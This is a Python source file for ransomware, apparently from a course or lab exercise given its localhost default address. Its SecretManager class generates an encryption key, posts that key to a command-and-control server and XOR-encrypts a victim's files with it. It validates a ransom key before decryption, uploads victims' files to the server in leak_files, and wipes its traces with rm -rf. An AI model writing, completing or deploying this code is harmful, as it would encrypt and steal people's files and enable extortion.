import logging
from os import urandom, system

from pathlib import Path
from typing import List, Tuple
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


from xorcrypt import xorfile


class SecretManager:
    KDF_ITERATION_NUMBER = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        # member variable storing the ip address and port of the cnc
        self._remote_host_port = remote_host_port
        # member variable storing a path
        self._path = path
        # member variables storing cryptigraphic data
        self._key = b''
        self._salt = b''
        self._token = b''
        
        self._log = logging.getLogger(self.__class__.__name__)
        

    def do_derivation(self, salt: bytes, key: bytes) -> bytes:
        # definition of the kdf used to derive salt and key into a token
        KDF = PBKDF2HMAC(algorithm = hashes.SHA256(),
                         length = SecretManager.KEY_LENGTH,
                         salt = salt,
                         iterations = SecretManager.KDF_ITERATION_NUMBER)
        token = KDF.derive(key)
        return token
   
    def create(self) -> Tuple[bytes, bytes, bytes]:
        # creation of two cryptographic values saved as salt and key, of length 16B with an cryptographically strong random number generator (not TRNG, though)
        salt = urandom(SecretManager.SALT_LENGTH)
        key = urandom(SecretManager.KEY_LENGTH)
        # derivation of salt and key into a unique token
        token = self.do_derivation(salt, key)
        # debug messages
        self._log.debug('cryptographic data generated:')
        self._log.debug((token, key, salt))

        return (salt, key, token)

    def bin_to_b64(self, data: bytes) -> str:
        # simple b64 encoding of any binary data passed as bytes
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt: bytes, key: bytes, token: bytes) -> int:
        # register the victim to the CNC

        # creation of a JSON holding the cryptographic data of the victim
        secrets_json = {
        "salt": self.bin_to_b64(salt),
                "key": self.bin_to_b64(key),
                "token": self.bin_to_b64(token),
                }

        # header to help post JSON
        header = {"Content-Type":"application/json"}
        self._log.debug(secrets_json)
        
        # generation of a directory label for the CNC based on the token
        # If the victim were to send an email to our address with the token hash as an object, we could match the corresponding key to the token hash inside of our CNC filesystem
        dir_label = self.get_hex_token()
        
        # URL to send POST request to; the parameter is the token hash
        url = f"http://{self._remote_host_port}/new?label={dir_label}"
        
        # post request at said URL with the content of secrets_json
        post_request = requests.post(url, json = secrets_json, headers=header)
        return post_request.status_code

    def setup(self) -> None:
        # main function to create crypto data and register malware to cnc

        # creation of crypto data and assignment to member variables
        self._salt, self._key, self._token = self.create()
        
        # post request of said data
        post_status_code = self.post_new(self._salt, self._key, self._token)

        # we can display the returned status_code to check that everything worked
        self._log.debug("post_new request returned with code " + str(post_status_code))
        
        token_path = f"{self._path}/token"
        if not Path(token_path).exists():  
            Path(token_path).mkdir(parents=True, exist_ok=False)
        if Path(f"{token_path}/token.bin").exists():
            raise FileExistsError
        
        # open taking parameter 'wb' allows the program to write into a binary file
        
        with open(f"{token_path}/token.bin", 'wb') as token_binary_file:
            token_binary_file.write(self._token)
        with open(f"{token_path}/salt.bin", 'wb') as salt_binary_file:
            salt_binary_file.write(self._salt)

        return None

    def xorfiles(self, files: List[str]) -> None:
        # xor a list for file
        logging.debug("XORFILE FUNCTION")
        [xorfile(file, self._key) for file in files]
        return None

    def get_hex_token(self) -> str:
        # Should return a string composed of hex symbols, based on the token
        token_digest = hashes.Hash(hashes.SHA256())
        token_digest.update(self._token)
        hashed_token = token_digest.finalize()
        
        return str(hex(int.from_bytes(hashed_token)))[2:-1]

    
    def load(self) -> None:
        # function to load crypto data
        token_path = f"{self._path}/token"
        with open(f"{token_path}/token.bin", 'rb') as token_file:
            self._token = token_file.read()
            self._log.debug(self._token)
        with open(f"{token_path}/salt.bin", 'rb') as salt_file:
            self._salt = salt_file.read()
            self._log.debug(self._salt)

        return None

    def check_key(self, candidate_key: bytes) -> bool:
        # Assert the key is valid
        token_candidate = self.do_derivation(self._salt, candidate_key)
        key_is_valid = (token_candidate == self._token)
        return key_is_valid

    def set_key(self, b64_key: str) -> bool:
        # If the key is valid, set the self._key var for decrypting
        candidate_key = base64.b64decode(b64_key)
        self._log.debug(candidate_key)
        if not self.check_key(candidate_key):
            return False 
        self._key = candidate_key
        self._log.debug(self._key)
        return True
    
    

    def clean(self, install_path) -> None:
        # remove ransomware and crypto data from the target
        system(f"rm -rf {self._path}/token")
        system(f"rm -rf {install_path}")
    
        return None

    def leak_files(self, files: List[str]) -> None:
        # send file, genuine path and token to the CNC
        dir_label = self.get_hex_token()
        folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
        header = {
                "Content-Type":"application/octet-stream"
                }
        for file in files:
            file_url = f"{folder_url}&file_name={file.rsplit('/', 1)[-1]}"
            with open(f'{file}', 'rb') as f:
                requests.post(file_url, files={f'f': f}, headers=header)
        
        return None
